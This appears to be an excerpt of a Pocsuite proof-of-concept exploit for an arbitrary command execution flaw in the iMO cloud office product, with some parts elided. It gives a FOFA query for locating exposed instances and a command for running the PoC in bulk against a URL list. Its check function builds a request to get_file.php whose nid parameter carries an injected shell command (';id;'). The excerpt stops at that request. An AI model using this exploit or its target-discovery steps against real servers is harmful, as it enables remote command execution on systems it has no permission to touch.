...
class DemoPOC(POCBase):
    ...
    name = "imo 云办公室-任意命令执行"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "imo 云办公室"  # 漏洞应用名称
    appVersion = "imo 云办公室"  # 漏洞影响版本
    ...
    pocDesc = """
            fofa:app="iMO-云办公室"
            pocsuite -r imo云办公室rce.py -f url.txt
        """  # POC用法描述
    ...
    def _check(self):
        ...
        result = []
        try:
            full_url = f"{self.url}/file/NDisk/get_file.php?cid=1&nid=;id;"
